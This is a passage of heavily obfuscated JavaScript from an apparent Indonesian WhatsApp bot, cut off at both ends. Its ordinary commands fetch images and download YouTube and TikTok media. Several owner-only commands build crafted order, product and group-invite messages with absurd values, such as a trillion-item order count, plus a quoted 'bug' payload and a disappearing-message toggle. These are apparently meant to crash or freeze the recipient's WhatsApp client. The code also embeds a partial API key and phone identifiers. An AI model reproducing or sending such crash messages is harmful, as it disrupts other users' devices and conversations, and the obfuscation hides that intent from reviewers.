_0x498168={};_0x498168[_0x1f7707(0x345,0x2b7,0x499,0x710)]=''+command,_0x498168['buttonText']=_0x396a92,_0x498168[_0x39f25f(0x3a9,0x6ce,0x67d,0x428)]=0x1;const buttonsxx=[_0x4c06b0,_0x498168],btnx___={'contentText':lang['success'](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+('\x20|\x20Request'+_0x39f25f(-0x143,0x2a0,-0x21c,0xd5))+sender[_0x1f7707(0x276,-0x6e,0x20e,-0x220)]('@')[0x4*-0x1ee+-0x26*0xca+0x25b4],'buttons':buttonsxx,'headerType':0x5,'videoMessage':bacotluxx[_0x1f7707(-0x208,-0x5eb,-0x28a,-0x17d)][_0x39f25f(0xe4,0x185,0x3cc,0x211)+'ge']},_0x2682f4={};_0x2682f4[_0x1f7707(0x418,0x753,0x491,0x70b)+'id']=[sender];const _0x282305={};_0x282305[_0x1f7707(-0x134,-0x336,-0xa8,0x354)]=mek,_0x282305[_0x39f25f(0x6b4,0x6dd,0x409,0x657)+'o']=_0x2682f4,alpha['sendMessag'+'e'](from,btnx___,MessageType[_0x39f25f(0x608,0x213,0x149,0x1a7)+_0x39f25f(-0x180,-0x8d,-0x26e,0x106)],_0x282305)[_0x1f7707(0x515,0x5a7,0x54b,0x2b2)](_0x496bbb=>{function _0x316c0f(_0xa096ae,_0x24f51b,_0x37c6b5,_0x4df8b9){return _0x39f25f(_0xa096ae,_0x4df8b9-0x359,_0x37c6b5-0x87,_0x4df8b9-0x1ea);}function _0x9e31cd(_0x5537f6,_0x3ef560,_0x1fb9ba,_0x11b927){return _0x39f25f(_0x11b927,_0x3ef560- -0x35,_0x1fb9ba-0x166,_0x11b927-0x1e8);}const _0x3e3f7f={'pSDen':function(_0x2d9e65,_0x4bb9d7){return _0x2d9e65(_0x4bb9d7);},'nEwod':_0x9e31cd(0x6f6,0x472,0x803,0x632)+_0x316c0f(0x8f8,0xf3,0x292,0x4c1)+_0x9e31cd(0x401,0x261,0x3a7,0x3a8)+_0x316c0f(0x5ea,0x90e,0x72a,0x64d)+'gi'};_0x3e3f7f[_0x9e31cd(0x4ec,0x92,0x331,-0x1e0)](reply,_0x3e3f7f['nEwod']);});break;case _0x39f25f(0x21a,0x17a,0x37f,0x610):case'indonesia':case _0x1f7707(0x53d,0x849,0x5ed,0x7f3):case _0x1f7707(-0x8a,0x276,-0x1c0,-0x1b9):case'korea':case _0x1f7707(0x960,0x46e,0x4ce,0x3ff):case'vietnam':case'jenni':case _0x1f7707(0x5cd,0x13f,0x3fe,-0x92):case _0x39f25f(0x1fd,0x35f,0x634,-0x71):case'rose':reply(lang[_0x1f7707(0x463,-0x97,0x7c,-0x40e)]());var cecan=await fetchJson(_0x39f25f(0x570,0x73c,0x774,0xa17)+_0x39f25f(-0x157,0x41,-0x372,-0x1b5)+_0x39f25f(0xabc,0x788,0x30f,0x667)+_0x39f25f(0x67a,0x573,0x4e7,0x40f)+'ecan/'+command+('?apikey=of'+_0x39f25f(0x2e5,0xb6,-0x24f,0x4a6)));let random_cecan=await getBuffer(cecan[_0x1f7707(0x455,0x816,0x38f,0x703)]);const mediaxxx=await alpha[_0x39f25f(-0x3b3,0xdb,0x16c,-0x1f8)+_0x1f7707(-0x9b,-0xa6,-0x23b,0x198)](from,random_cecan,MessageType[_0x1f7707(-0x513,-0x27e,-0x15d,-0x21d)],{'thumbnail':Buffer[_0x39f25f(-0x11,0xf4,-0x32b,0x485)](0x219d+0x4*0x5d1+-0x38e1*0x1)});let bacotluxxx=mediaxxx[_0x39f25f(-0x267,-0xdc,-0x1b4,0x3a2)][_0x1f7707(0x2dc,0x49f,0x427,0x783)+'essage']?mediaxxx[_0x39f25f(0x1ad,-0xdc,-0x494,-0x8b)][_0x1f7707(0x740,0x6a2,0x427,0x1f6)+_0x39f25f(0x2ac,0x248,0x5ab,0x5eb)]:mediaxxx;const _0x5202b9={};_0x5202b9[_0x39f25f(-0x391,0x0,0x16b,-0x350)+'t']=_0x1f7707(-0x52e,-0x322,-0x229,-0x4ed);const _0xee9b3b={};_0xee9b3b['buttonId']=_0x1f7707(0x796,0x352,0x51d,0x4fe),_0xee9b3b['buttonText']=_0x5202b9,_0xee9b3b[_0x39f25f(0x555,0x6ce,0x30c,0xa06)]=0x1;const _0xc56a95={};_0xc56a95[_0x1f7707(0x15b,0x190,-0x1ae,-0x1b7)+'t']='Next\x20➡️';const _0x10a2b3={};_0x10a2b3['buttonId']=''+command,_0x10a2b3[_0x39f25f(0xc1,0x37c,0x446,0x2db)]=_0xc56a95,_0x10a2b3[_0x1f7707(0x250,0x666,0x520,0x252)]=0x1;const buttonsxxx=[_0xee9b3b,_0x10a2b3],btnxx__={'contentText':lang[_0x39f25f(0x2bf,0x4d9,0x5c6,0x20d)](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+(_0x39f25f(0x567,0x247,0x21d,0x6a1)+_0x39f25f(0x6b8,0x2a0,0x455,0x649))+sender[_0x1f7707(0x655,-0x9a,0x20e,-0x17e)]('@')[0x236c+0x1*0x1e13+-0x417f],'buttons':buttonsxxx,'headerType':0x4,'imageMessage':bacotluxxx[_0x1f7707(-0x139,-0x57d,-0x28a,-0x628)][_0x1f7707(0x13a,-0x251,-0x1fb,0x202)+'ge']},_0x25bcc7={};_0x25bcc7[_0x39f25f(0x856,0x63f,0x258,0x78a)+'id']=[sender];const _0x420f10={};_0x420f10[_0x39f25f(0x81,0x106,0x131,-0xac)]=mek,_0x420f10[_0x1f7707(0x6d9,0x8b4,0x52f,0x5ab)+'o']=_0x25bcc7,alpha[_0x39f25f(0x191,-0x84,-0x49c,-0x520)+'e'](from,btnxx__,MessageType[_0x39f25f(-0xad,0x213,0x492,0x3f0)+'sage'],_0x420f10)['catch'](_0x506b69=>{const _0xc2956f={};_0xc2956f[_0x225e03(0x48b,0x484,0x8bd,0x4cb)]=_0x225e03(0x6ca,0x8f8,0x748,0x4ac)+'salahan,\x20c'+'oba\x20bebera'+_0x5378bc(0x271,0x325,0x461,0xd8)+'gi';function _0x225e03(_0x28a61a,_0x1abadc,_0x4bc0e9,_0x3280f6){return _0x39f25f(_0x1abadc,_0x3280f6-0x5,_0x4bc0e9-0x145,_0x3280f6-0x18d);}const _0xa630be=_0xc2956f;function _0x5378bc(_0x1b24f4,_0x132e90,_0x2cdd93,_0x48f44c){return _0x1f7707(_0x1b24f4-0x124,_0x48f44c,_0x1b24f4-0x12b,_0x48f44c-0x1a7);}reply(_0xa630be[_0x225e03(0x3bb,0x193,0x766,0x4cb)]);});break;case'sc':case _0x39f25f(0x4e8,0x257,-0xad,0x104):case'sourcecode':source=_0x39f25f(0x5a2,0x848,0x987,0x8cf)+_0x1f7707(0x18e,0x133,-0x117,-0x50c)+_0x39f25f(0x177,0x21b,0x5c8,-0x1fe)+_0x1f7707(0x179,0x6c2,0x577,0x145)+_0x39f25f(0x55f,0x576,0x166,0x51a)+_0x39f25f(-0x155,0x43,-0x372,0x2b4),reply(source);break;case _0x39f25f(0x315,0x1f7,0x279,0x4af):sendKatalog('BY\x20ZEEONE\x20'+_0x39f25f(-0x188,0x43,0x61,0x499),_0x39f25f(0x851,0x3df,0xb1,0x316)+'00',_0x1f7707(-0xe6,0x8a,0x8b,0x24));break;case _0x1f7707(0x296,0x2b1,0x1a9,0x18a):if(!isOwner&&!mek[_0x1f7707(-0x23c,0x1a,-0x8b,0x21)]['fromMe'])return reply(_0x39f25f(0x82e,0x7c0,0x759,0xc79)+'ir\x20🤔');let buffe=fs[_0x1f7707(-0x1a9,0x36,0x106,-0x35a)+'nc'](_0x39f25f(0x26e,0x54f,0x540,0x43f)+thumbnail);imeu=await alpha[_0x1f7707(-0x319,-0x263,-0xd3,-0x473)+_0x1f7707(-0x5a8,-0x7a,-0x23b,-0x169)](_0x39f25f(-0x23,0x121,0x40,-0x149)+'pp.net',buffe,image),imeg=imeu[_0x1f7707(0x1ae,-0x42,-0x28a,0x14e)]['imageMessa'+'ge'];const _0x353f70={};_0x353f70[_0x1f7707(-0x193,0x682,0x2bd,0x6de)+'ge']=imeg,_0x353f70['productId']=_0x39f25f(0x1c8,0x673,0xa6d,0x813)+_0x1f7707(-0x660,-0x86,-0x206,-0x81),_0x353f70[_0x39f25f(0x32f,-0x118,-0xf7,-0x316)]=_0x1f7707(0x2a0,-0x608,-0x17b,-0x1d1)+_0x1f7707(-0x19,0x128,-0x6e,-0x398),_0x353f70[_0x39f25f(-0xa7,0x144,-0x203,0x60)+'n']=''+vipi,_0x353f70[_0x1f7707(-0xdd,-0x19b,-0x15b,0xb2)+'de']=_0x39f25f(0x3da,0x734,0x718,0x71a),_0x353f70[_0x39f25f(0x6d5,0x7ce,0x6e1,0x312)+'t1000']='9199191919'+_0x39f25f(-0x296,-0x13,-0x30c,-0x41c)+_0x1f7707(0x819,0x6f7,0x486,0xd2),_0x353f70[_0x1f7707(0x6dd,0x11f,0x2bd,0x447)+_0x39f25f(0x9a,0xd0,0x2d4,-0x29f)]=0x1;const _0x40ebb6={};_0x40ebb6[_0x1f7707(0x809,0x74a,0x50c,0x945)+'Score']=0x3,_0x40ebb6[_0x39f25f(0x213,0x5d,-0xf2,-0x141)+'d']=!![];const _0x22cb5f={};_0x22cb5f['product']=_0x353f70,_0x22cb5f[_0x39f25f(0x378,0x364,0x12b,0x517)+_0x39f25f(0x4ed,0x727,0x455,0x818)]='6288743504'+'7326@s.wha'+_0x39f25f(-0x41f,-0xf5,0x352,0x194),_0x22cb5f[_0x39f25f(0x9c2,0x6dd,0x6b5,0x68d)+'o']=_0x40ebb6;const _0x3bafc0={};_0x3bafc0[_0x1f7707(-0x76,0x3a0,0x3ab,0x7a8)+_0x39f25f(-0x2fe,-0x8d,0x230,0x2b2)]=_0x22cb5f;const _0x246da3={};_0x246da3['quoted']=ftroli,_0x246da3[_0x1f7707(-0x362,-0x227,-0xe8,-0xca)]={},res=await alpha['prepareMes'+_0x1f7707(0x139,0x7ec,0x54a,0x975)+_0x39f25f(0xba9,0x7b0,0x805,0x55b)](from,_0x3bafc0,_0x246da3),alpha[_0x39f25f(0x519,0x42d,0x581,0x116)+_0x1f7707(0xbd,-0x4ee,-0x23b,-0x21f)](res);break;case _0x39f25f(0x4a0,0x189,0x21a,0x35e):if(!isOwner&&!mek[_0x1f7707(-0x62,-0x2d8,-0x8b,-0x2e)][_0x39f25f(0x564,0x4be,0x833,0x3a8)])return reply(_0x39f25f(0x893,0x7c0,0x7b2,0xc64)+_0x1f7707(-0x15,0x103,0x39d,0x40b));let bugf=fs[_0x39f25f(0x6ca,0x2b4,0x47b,0x184)+'nc'](_0x1f7707(0x40b,0x60f,0x3a1,-0x39)+thumbnail);imeu=await alpha[_0x39f25f(0xc2,0xdb,-0x1a6,-0x382)+'sage'](_0x39f25f(0x16d,0x121,0x5e,0xb3)+_0x1f7707(0x7b6,0x793,0x5a0,0x222),bugf,image),imeg=imeu[_0x39f25f(0x350,-0xdc,0x374,-0x384)][_0x39f25f(0x3f4,-0x4d,0x2ec,0x43e)+'ge'];const _0x5626ba={};_0x5626ba[_0x1f7707(0x866,0x505,0x50c,0x3f2)+'Score']=0x3,_0x5626ba[_0x39f25f(-0xfa,0x5d,-0xcd,-0x454)+'d']=!![];const _0x47b16e={};_0x47b16e[_0x39f25f(0x35c,0x106,-0xed,-0x319)]=bugtrol,_0x47b16e[_0x39f25f(0x9e9,0x6dd,0x420,0x2c6)+'o']={},res=await alpha['prepareMes'+_0x1f7707(0x48a,0x582,0x54a,0x2e9)+'ntent'](from,{'orderMessage':{'orderId':'3595319159'+_0x39f25f(-0x47b,-0x58,-0x4a1,-0x8a),'thumbnail':fs['readFileSy'+'nc']('./image/'+thumbnail),'itemCount':0xe8d4a51000,'status':_0x1f7707(0x927,0x9f8,0x5be,0xa44),'surface':_0x39f25f(0x8f7,0x698,0x769,0x4ca),'orderTitle':_0x1f7707(0x466,0x4b3,0x340,0x38c),'message':_0x1f7707(0x222,0x2a0,-0x74,-0x44a),'sellerJid':'6288743504'+_0x39f25f(0x6d,0x383,0x1cb,0x733)+_0x39f25f(0x226,-0xf5,-0x507,-0x48a),'token':_0x39f25f(-0x5b,0x394,0x148,0x1c2)+'4W5fYrjbea'+_0x1f7707(0xd1,0x359,-0x14d,-0x1ab)+_0x39f25f(-0x141,0x24f,0x4cc,0x441)+'0FGwkw==','totalAmount1000':_0x1f7707(-0x153,0x3fd,0x14b,0xf6)+_0x1f7707(0xd6,-0x1fd,0x14b,-0x218),'totalCurrencyCode':'IDR','contextInfo':_0x5626ba}},_0x47b16e),alpha['toggleDisa'+'ppearingMe'+'ssages'](from,_0x1f7707(0x498,0x456,0x245,0x1eb)),alpha[_0x1f7707(0x5e9,-0x1a6,0x27f,0x45f)+_0x39f25f(0x78,-0x8d,-0x14f,-0x324)](res);break;case _0x1f7707(0x291,0x39d,0xfb,0x2f6):if(!isOwner&&!mek['key']['fromMe'])return reply(_0x39f25f(0xada,0x7c0,0x5bc,0x6a1)+'ir\x20🤔');let buf=fs[_0x39f25f(-0x1ed,0x2b4,-0x14a,0x99)+'nc'](_0x39f25f(0x9c5,0x54f,0x45a,0x49e)+thumbnail);imeu=await alpha['prepareMes'+_0x1f7707(-0x29,-0x364,-0x23b,-0x10a)](_0x1f7707(-0x545,-0x303,-0x8d,0x225)+_0x1f7707(0xa5d,0x78f,0x5a0,0x3b0),buf,image),imeg=imeu[_0x1f7707(-0x3b9,-0x6f,-0x28a,-0x1a8)][_0x39f25f(-0x231,-0x4d,-0x501,0x54)+'ge'];const _0x17f349={};_0x17f349[_0x1f7707(0x423,0x8ae,0x50c,0x47e)+'Score']=0x3,_0x17f349[_0x39f25f(0x4b9,0x5d,0x335,0x2e4)+'d']=!![];const _0x2566f2={};_0x2566f2['groupJid']='8529655657'+_0x1f7707(0x624,0xaab,0x61d,0x802)+_0x39f25f(-0x21b,-0xde,0x281,0xd7),_0x2566f2['inviteCode']=_0x1f7707(-0x26b,-0x341,-0x39,0x128)+_0x1f7707(0x12a,0x4dc,0x2d6,0x144),_0x2566f2[_0x1f7707(-0x15c,0x136,-0x2aa,-0x29b)+_0x39f25f(0x28b,0x560,0x952,0x4cd)]=_0x39f25f(-0x2a9,-0x124,-0x58c,-0x118)+_0x39f25f(0x715,0x5e5,0x1b6,0x435),_0x2566f2['groupName']=_0x39f25f(-0x224,0x33,-0x98,0x2f7)+_0x39f25f(0x2e,0x347,0x65b,0x58c)+vipi,_0x2566f2['jpegThumbn'+_0x1f7707(0x1f0,-0x39,0x165,0x2b0)]=buf,_0x2566f2[_0x39f25f(0x557,0x11c,0x3ac,-0x162)]=_0x39f25f(0x74b,0x825,0x90b,0x717)+_0x1f7707(0x397,0x71,-0x10a,0x99)+_0x39f25f(0x3d3,0x40a,-0x37,0x76b)+'IwuwLlFELw'+'97ByRk79',_0x2566f2[_0x1f7707(0x197,0x59b,0x52f,0x39c)+'o']=_0x17f349;const _0x2fa716={};_0x2fa716['groupInvit'+_0x39f25f(0x37a,0x82d,0xad2,0x668)]=_0x2566f2;const _0x1fce4e={};_0x1fce4e[_0x1f7707(-0x1cc,-0x15c,-0xa8,0xdb)]=imeu,_0x1fce4e['contextInf'+'o']={},res=await alpha[_0x39f25f(-0xe7,0xdb,0x85,0x436)+_0x1f7707(0x8eb,0x3e8,0x54a,0xfb)+'ntent'](from,_0x2fa716,_0x1fce4e),alpha[_0x1f7707(0x667,0xb5,0x27f,0x4f5)+_0x1f7707(0x263,-0x2b3,-0x23b,-0xc3)](res);break;case _0x39f25f(-0x269,0x4f,-0x2b9,-0x44f):if(!isOwner&&!mek[_0x1f7707(-0x3a8,-0x44d,-0x8b,-0x294)]['fromMe'])return reply(_0x39f25f(0x9cf,0x7c0,0x385,0x5b7)+_0x39f25f(0x322,0x54b,0x423,0x6cd));tapib1=fs[_0x39f25f(0x183,0x2b4,-0x45,-0x24)+'nc'](_0x1f7707(0x628,0x271,0x2fa,0x579)+_0x39f25f(0x1a6,0x105,0xd4,-0x34e)+'.mp3');const _0x166ebc={};_0x166ebc['quoted']=mek,_0x166ebc[_0x1f7707(0xa4d,0x8ba,0x62e,0x9e6)]=creator+'\x20'+vipi+_0x1f7707(0x1da,-0x207,0x27a,0x5d3),_0x166ebc[_0x39f25f(-0x11a,0x37d,0x160,0x540)]=_0x1f7707(0x8b0,0x3c8,0x47a,0x41)+_0x1f7707(-0x481,0x44e,-0x60,0x28),alpha[_0x39f25f(-0x3a8,-0x84,0x9e,0xe5)+'e'](from,tapib1,document,_0x166ebc);break;case'play':if(!isGroup)return reply(lang[_0x39f25f(0x5bb,0x1ca,-0x124,0x446)]());if(args[_0x39f25f(0x723,0x67a,0x3bb,0xa97)]<-0x21f*0x2+0x2629+0x5a7*-0x6)return reply(_0x1f7707(-0x36f,-0x14c,0x134,-0x83)+_0x39f25f(0xaaa,0x603,0x6a7,0x6ee)+prefix+(_0x1f7707(-0x12f,0x211,0x382,-0xc8)+'*'));reply(lang['wait']());let yut=await yts(q);server=_0x1f7707(0x544,0x33d,0x57b,0x9b1),yta2(yut['videos'][-0x14cd+0xb3*0x2e+-0xb5d*0x1][_0x39f25f(0x3d6,0x342,0x346,0x3b1)],server)[_0x1f7707(-0x4a,0x287,0x234,-0xe6)](async _0x2d4ee9=>{const _0x891054={'GxFst':function(_0x16b1a0,_0x1c3850){return _0x16b1a0(_0x1c3850);},'EdTHF':_0x5bc887(0x789,0x192,0x551,0x3f9),'BtepI':'RESPONSE'},{thumb:_0x1d8687,title:_0x359ab1,filesizeF:_0xe49841,filesize:_0x2f6bc3}=_0x2d4ee9,_0x152534=_0x5bc887(0x549,0x617,0x2e2,0xf3)+_0x39be11(0x209,0x2ce,0x4c8,-0x168)+_0x39be11(-0x207,-0x536,-0x116,-0x52d)+_0x39be11(-0x17,-0x6b,-0x27,-0x362)+_0x359ab1+_0x5bc887(0x478,0x8a9,0x4bb,0x37a)+yut[_0x5bc887(0x9b6,0x5d2,0xa83,0xdc5)][-0x6bf+0xb9e+0x4df*-0x1][_0x39be11(0x648,0x5aa,0x763,0x748)]+(_0x5bc887(0xd1f,0xcd0,0xb86,0xa8c)+':\x20')+yut[_0x5bc887(0x611,0xec8,0xa83,0xe1d)][-0x2*0x2ea+0x303*0x2+-0x32][_0x39be11(0x479,0x644,0x711,0x168)]+_0x39be11(0x46b,0x653,0x619,0x58c)+_0xe49841+_0x39be11(-0x128,-0x19a,-0x445,0x14e)+yut['videos'][0x5f*0x39+-0xba0+-0x987][_0x5bc887(0x908,0x6ed,0x946,0x5e6)]+(_0x5bc887(0x28e,0x57,0x381,0x7b1)+_0x5bc887(0x494,0x5e0,0x881,0x4c9))+yut['videos'][-0x9f*0x1+0xae*-0x17+0xdb*0x13][_0x39be11(0x281,0x1b3,0x64,0x653)]+_0x5bc887(0x4fe,0xb3b,0x85b,0x86d)+yut[_0x5bc887(0xe81,0xb22,0xa83,0xc65)][-0x211f*-0x1+0xf0b*-0x1+0x1*-0x1214][_0x39be11(0x1f6,-0x295,-0x20d,0x227)]+(_0x5bc887(0x53e,0x9c2,0x518,0x928)+_0x39be11(0x482,0x7eb,0x814,0x78b)+_0x5bc887(0xd86,0x6ee,0x8e5,0x531)+_0x5bc887(0x750,0x7b8,0x8da,0x83a)+'ownload_');let _0x56ef35=await _0x891054[_0x39be11(0x12b,0x5b5,0x50,0x1e)](getBuffer,_0x1d8687);const _0x2129e4={};_0x2129e4[_0x39be11(-0x14c,-0x420,-0x42c,-0x1e1)+'t']=_0x891054[_0x5bc887(0x4ce,0xbb3,0x908,0xa1c)];function _0x5bc887(_0x5953ac,_0xe16ec,_0x2328e3,_0x2c7deb){return _0x39f25f(_0xe16ec,_0x2328e3-0x360,_0x2328e3-0x11f,_0x2c7deb-0xd6);}const _0x34e654={};_0x34e654[_0x5bc887(0xda1,0x923,0x9a7,0x739)]=_0x5bc887(0x68e,0x65a,0x876,0x7bd)+q,_0x34e654[_0x39be11(0x230,0x17a,0x40c,0x51a)]=_0x2129e4,_0x34e654[_0x39be11(0x582,0x2ae,0x47b,0x7cf)]=_0x891054[_0x39be11(0x27,-0x27a,0x421,-0xab)];function _0x39be11(_0x337128,_0x4bc1e0,_0x20425d,_0x766680){return _0x39f25f(_0x4bc1e0,_0x337128- -0x14c,_0x20425d-0xbf,_0x766680-0x4);}const _0x257590={};_0x257590[_0x39be11(-0x14c,-0x513,-0x1da,-0x3fb)+'t']=_0x5bc887(0xacd,0xb13,0xac7,0xc04);const _0x3bd141={};_0x3bd141[_0x5bc887(0x5cd,0x592,0x9a7,0x76f)]=_0x5bc887(0x768,0x3d1,0x535,0x25a)+yut[_0x5bc887(0xd1b,0x8d9,0xa83,0x738)][-0x9d9+0x16*-0x17b+-0x2a6b*-0x1][_0x39be11(0x1f6,0x488,0x2d5,-0x212)],_0x3bd141['buttonText']=_0x257590,_0x3bd141[_0x39be11(0x582,0x8ad,0x717,0x5f8)]=_0x891054['BtepI'];let _0x145c71=[_0x34e654,_0x3bd141];sendButLocation(from,_0x152534,_0x5bc887(0x45f,0x61d,0x6d9,0x766)+_0x5bc887(0x301,0x43e,0x5dc,0x61a)+_0x5bc887(0xa28,0x7a4,0x67a,0x244)+enter+enter+botname+'™©\x20|\x20By\x20'+ownername,_0x56ef35,_0x145c71,{});})['catch'](_0x2c22e2=>reply(_0x1f7707(-0x16e,0x619,0x2f9,0x204)+_0x1f7707(0x4a,0x140,-0x46,-0x63)+_0x39f25f(0x16e,0x296,0x44b,0x48c)+'pa\x20saat\x20la'+'gi'));break;case _0x1f7707(0x3d1,-0x3de,0x81,0x63):if(!isUrl(args[0xf32+-0x1e07+-0xed5*-0x1])&&!args[-0x1f*0xc3+-0x1123+-0x10*-0x28c][_0x39f25f(0x34d,0x54d,0x38c,0x60e)](_0x39f25f(-0x147,0x2b6,0x195,-0x47)))return reply(lang[_0x1f7707(-0x31e,-0x543,-0x1ea,-0x441)]());if(!q)return fakegroup(_0x1f7707(0x7a0,0x37d,0x63a,0x27e));reply(lang['wait']()),ttt=args[_0x1f7707(0x125,0x71c,0x2bf,0x55)]('\x20'),hx[_0x39f25f(0xa13,0x799,0x30d,0xb7c)+'er'](ttt)[_0x1f7707(0x1fe,0x478,0x234,0x5c5)](_0x4bd56=>{const _0x397ec1={'wuTPf':function(_0x3a8ddc,_0x1211fc){return _0x3a8ddc(_0x1211fc);},'siAzy':function(_0x567ffb,_0x310353){return _0x567ffb!==_0x310353;},'mRaeN':_0x58da54(0x360,0x641,0x466,0x4cb),'CXyLd':_0x33ee0a(0x250,0x653,0x34f,0x3cf),'qdqwA':'RESPONSE','fNirZ':_0x33ee0a(0xe29,0x6a6,0x9ab,0xa6c),'svYmU':function(_0x57bb62,_0x4306fa,_0x7e3f09,_0x4bfa14,_0x529f80,_0x3963cf,_0x2a6cdd){return _0x57bb62(_0x4306fa,_0x7e3f09,_0x4bfa14,_0x529f80,_0x3963cf,_0x2a6cdd);}},{wm:_0x250f12,nowm:_0x45c272,audio:_0x5521f8}=_0x4bd56;function _0x58da54(_0x422ac9,_0x38b660,_0x526e40,_0x35d951){return _0x1f7707(_0x422ac9-0x45,_0x35d951,_0x422ac9-0x4d4,_0x35d951-0x1b6);}function _0x33ee0a(_0x19bdbe,_0x143d69,_0x5a1629,_0x517e1a){return _0x1f7707(_0x19bdbe-0x62,_0x19bdbe,_0x517e1a-0x4b3,_0x517e1a-0x158);}axios[_0x58da54(0x5ae,0x1b3,0x6b3,0x595)]('https://ti'+_0x33ee0a(0x5aa,0x39e,0x41f,0x532)+_0x33ee0a(0x901,0x75f,0x81e,0x755)+_0x33ee0a(0xb09,0xdf4,0x756,0x96d)+_0x250f12)[_0x58da54(0x708,0x9ae,0x7a0,0xa74)](async _0x3a9d5c=>{function _0x257708(_0x250648,_0x1b8f8a,_0x50c972,_0x5e4235){return _0x58da54(_0x5e4235- -0x315,_0x1b8f8a-0xe6,_0x50c972-0x14,_0x1b8f8a);}const _0x4b5e60={'KlhIS':function(_0x58f9ae,_0x237500){function _0x2ddd45(_0x2019c2,_0x4dd4b7,_0x228d0c,_0x465ac9){return _0x3a08(_0x4dd4b7-0x278,_0x465ac9);}return _0x397ec1[_0x2ddd45(0x58b,0x6fd,0x73b,0x718)](_0x58f9ae,_0x237500);}};function _0xe18739(_0x118b49,_0x1e8e94,_0x36bd50,_0x2a2782){return _0x58da54(_0x2a2782- -0xb1,_0x1e8e94-0x18e,_0x36bd50-0x118,_0x36bd50);}if(_0x397ec1[_0xe18739(0x446,0x815,0x437,0x63a)](_0x397ec1['mRaeN'],_0x397ec1['mRaeN']))_0x4b5e60[_0x257708(0x9bc,0x434,0x817,0x54b)](_0x5f227d,_0x57be2f[_0x257708(0x1e9,-0x16a,0x6c8,0x23b)]()),_0x1f4b69[_0x257708(-0x128,0x341,0x1bb,0x299)](''+_0x3d0309)[_0xe18739(0xa5a,0x9de,0x7d9,0x657)](_0x317121=>{_0x284ca0=''+_0x317121[_0x6a1d44(0xd61,0x11e2,0xca9,0xa9d)][-0xe*-0x103+0xb5d+0x1981*-0x1]['url'];function _0x6a1d44(_0x46b5fa,_0x366aa8,_0xb1e108,_0x3cdabd){return _0xe18739(_0x46b5fa-0x1a9,_0x366aa8-0x173,_0x366aa8,_0x46b5fa-0x2e9);}_0x42d522['log'](_0x2f6e5f),_0x484d39(_0x1f5967,''+_0x4a5712);});else{let _0x17e124=await getBuffer(_0x250f12);const _0x802e1={};_0x802e1[_0xe18739(-0x21e,0x19b,0x398,0x275)+'t']=_0x397ec1['CXyLd'];const _0x879dc6={};_0x879dc6[_0xe18739(0x50f,0x97e,0x939,0x8bc)]=_0x257708(0x89f,0x3db,0x9d6,0x5a0)+'\x20'+q,_0x879dc6['buttonText']=_0x802e1,_0x879dc6['type']=_0x397ec1[_0x257708(0x38c,0xd7,0x4bf,0x88)];const _0x193c12={};_0x193c12['displayTex'+'t']=_0x397ec1[_0xe18739(0x49b,0x1ae,0x1ce,0x41d)];const _0x3c04db={};_0x3c04db['buttonId']='tiktokaudi'+'o\x20'+q,_0x3c04db[_0x257708(0x1f2,0x28d,0xcd,0x38d)]=_0x193c12,_0x3c04db[_0xe18739(0xd05,0xd9a,0xb83,0x943)]=_0x397ec1[_0x257708(-0x3d0,-0x36a,0x116,0x88)];let _0x706c17=[_0x879dc6,_0x3c04db];_0x397ec1[_0xe18739(0x57a,0xa41,0x93e,0x9a3)](sendButVideo,from,_0xe18739(0xa16,0xac0,0xb0e,0x931)+sender['split']('@')[0x3*0x6c7+-0x19c3+0x2b7*0x2]+(_0xe18739(0x925,0xbbc,0x72f,0x9f0)+'nya\x20klo\x20ma'+_0xe18739(0x3b4,0x1a9,0x621,0x4de)+_0xe18739(0x884,0x4ab,0xe,0x4b6)+_0xe18739(0xcd8,0xad2,0xb79,0x9a8)+_0x257708(0x8f,0x71d,0x4aa,0x3e0)+_0x257708(-0xae,-0x43,0x82,-0xd0)+_0x257708(0x664,-0x22e,0x52e,0x243)+'h'),'NOTE\x20！'+enter+(_0xe18739(0xa53,0x77f,0x68c,0x737)+'app\x20mod\x20ka'+_0xe18739(0x731,0x813,0xafc,0xa3e)+'upport\x20but'+_0x257708(-0x3aa,0x284,0x1c1,0x24)+_0xe18739(0x757,0x6a6,0xa6d,0x7c9)+_0xe18739(0x8b6,0x6d9,0x76a,0x7a4)+'https://yo'+_0xe18739(0x366,0x4c9,0x69d,0x235)+_0xe18739(0x4a8,0x535,0x6d9,0x374))+enter+enter+botname+_0xe18739(0xba8,0x655,0xe9c,0xab6)+ownername,_0x17e124,_0x706c17,{'contextInfo':{'mentionedJid':[sender]}});}});})['catch'](_0xdbfdf1=>console[_0x1f7707(-0x9c,0x26d,0x3f1,0x566)](_0xdbfdf1));break;case _0x1f7707(0x3ed,0x4df,0x331,0x658)+_0x1f7707(-0x4bf,-0x36e,-0x284,-0x47b):if(args['length']<-0xe49*-0x1+-0x1732+0x8ea)return reply('Example:\x20'+(prefix+command)+(_0x39f25f(0x120,-0x74,0x21e,-0x512)+_0x39f25f(0x15a,0x32b,0x7ac,0x3bf)+_0x1f7707(0x713,0xfe,0x525,0x910))+enter+_0x1f7707(-0x137,0x2a7,-0xda,-0x1e)+(prefix+command)+_0x1f7707(0x48b,0x246,0x330,0x601));var F=q,F1=F['split']('|')[-0x20dc+-0x2547+0x357*0x15],F2=F['split']('|')[-0x2*-0x1149+0x1fcf+-0x4260];let pijaqu=await fetchJson(_0x39f25f(-0x4,0xe2,0x26f,0xb3)+_0x1f7707(0x6ab,0x162,0x2b7,0x136)+_0x1f7707(0x576,0x545,0x611,0x586)+'alquran-ap'+_0x1f7707(0x638,0x22c,0x1e0,-0x184)+'c.vercel.a'+_0x39f25f(0x361,0x3f8,0x1e8,0x4af)+F1+'/'+F2),japkk=await getBuffer(pijaqu[_0x39f25f(0x9c2,0x513,0x38c,0x4de)][_0x1f7707(-0x494,-0x37f,-0x49,0x434)][_0x39f25f(0x749,0x5cd,0x552,0x7ed)])['catch'](_0x306309=>{const _0x34baa1={'LbhBE':function(_0xec1867,_0x2820c5){return _0xec1867(_0x2820c5);},'OJgMV':_0x442901(0x6cc,0x2f5,0x12c,-0x15d)};function _0x4dd6f4(_0x41a66c,_0x476cd2,_0x205b31,_0x3020fc){return _0x1f7707(_0x41a66c-0x1b8,_0x3020fc,_0x41a66c-0x41b,_0x3020fc-0x12c);}function _0x442901(_0x47da00,_0x2385fa,_0x17c5eb,_0x438f26){return 